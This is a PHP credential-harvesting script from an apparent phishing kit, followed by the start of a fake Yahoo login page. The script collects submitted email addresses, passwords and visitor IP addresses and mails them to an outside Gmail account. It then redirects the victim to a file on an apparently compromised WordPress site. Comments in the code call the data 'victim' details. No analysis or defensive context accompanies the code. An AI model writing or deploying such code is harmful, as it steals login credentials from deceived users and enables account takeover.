<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-========================GENERAL HACK==============================-\n";
$message .= "GENERAL User & Pass \n";
$message .= "------------------------------------------------------------------\n";
$message .= "User : ".$_POST['email']."\n";
$message .= "PassWord : ".$_POST['epass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-============================by CarcaBot=============================-\n";
 // Write/Mail Get Victim Dates

 
$recipient = "crisonlinelogs@gmail.com";
$subject = "General Info";
$headers = "From: GENERAL ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0n";
	 mail("$to", "GENERAL Info", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://tishabavevent.org/wp-includes/wqws3t.jpg");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
<title>yahoo</title>


<form method="post" action="smilez.php" name="login_form">
            <table id="yreglgtb" summary="form: login information"> 